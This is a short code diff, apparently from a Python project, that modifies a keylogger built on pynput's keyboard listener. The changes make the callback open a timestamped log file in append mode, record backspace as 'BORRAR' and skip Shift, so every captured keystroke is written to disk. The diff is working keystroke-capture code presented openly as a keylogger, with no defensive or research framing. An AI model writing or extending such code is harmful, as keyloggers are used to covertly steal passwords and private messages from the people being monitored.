@@ -3,9 +3,10 @@ from pynput.keyboard import Listener
 
 d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
 
-f = open(f'keylogger_{d}.lua', "w")
+
 
 def registro(llave):
+    f = open(f'keylogger_{d}.lua', "a")
 
     llave = str(llave)
 
@@ -17,7 +18,9 @@ def registro(llave):
     elif llave == 'Key.space':
         f.write(' ')
     elif llave == 'Key.backspace':
-        f.write('%BORRAR%')
+        f.write('BORRAR')
+    elif llave == 'Key.shift':
+        f.write('')
     else:
         f.write(llave.replace("'",""))
 
